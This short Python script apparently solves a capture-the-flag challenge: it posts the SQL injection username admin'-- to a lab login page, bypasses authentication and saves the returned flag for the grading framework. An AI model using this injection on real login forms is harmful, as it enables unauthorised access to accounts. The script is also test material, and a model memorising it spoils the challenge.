#!/usr/bin/env python3
import requests
import re

# Send the request to the flask server.  Note that docker creates a DNS record
# for challenge that redirects to the correct instance.
r = requests.post('http://challenge:8000/login.php',
                  data={"username":"admin'--",
                        "password":"does not matter",
                        "debug":1
                       }
                 )

# Extract the flag.
flag = re.search(r"Your flag is:\s+([a-zA-Z0-9{}_-]+)", r.text).group(1)

# Write the flag out to where the framework will read it.
with open('flag', 'w') as f:
    f.write(flag)
